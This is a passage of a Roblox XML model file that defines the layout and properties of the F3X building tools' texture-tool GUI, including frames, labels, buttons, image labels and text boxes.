										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX83490641105A43BCBE4210036955B214">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>6</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-6</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">TIP: Select a part and right click on a surface</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX22C9AC429E524373942164BAFB1661C8">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTTextureToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>172</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>200</XO>
									<YS>0</YS>
									<YO>205</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXABD45AF727B04B69874106AA6379EA89">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX70695A4EBFBF4A7185D4417708CDFB8A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX6F7DE364CA264FA481BAEAD1F6DC09DF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">TEXTURE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCFFDFC662A3A4692A4680C699C2ACE39">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX1196E2797C074437ADD2EEBF6253E33F">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">SideOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>14</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-14</XO>
										<YS>0</YS>
										<YO>25</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBXBCCF4819C2F44A9DAF6BC9E60231D830">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>30</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Side</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX78379BF4754146D4A2DBA2C132ABF3A7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">RepeatOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>205</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX17CC9B41050444B88486543D7EF46769">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>14</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Repeat</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXA0B241C3881A47EEB3685F35A02662C7">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">XInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBXA6B45AB9B1C04F5289AC0FC7841A7613">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXBCEB27BCFB184633AC7B898944E2FE52">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXD7ECD5F6BDCD4096B9CEEB2FE57DDF54">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBXAE7F9A3AB1B943BF9EABDEE6023BF8F0">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">2</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX91AC8FE21F68489585FD4D7DAE756716">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">YInput</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>105</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>45</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextButton" referent="RBX3E909B0C6FE1427A8AB9F950A0E1962D">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">false</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">TextButton</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBXEF7CA4D93A1E4F01B1C6548E0648A587">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBX6701BFDC8B8B4500BB6DCC6DD66B79B1">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX2B9B40F8D18F44DCB6B1CDEFD16CA41A">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
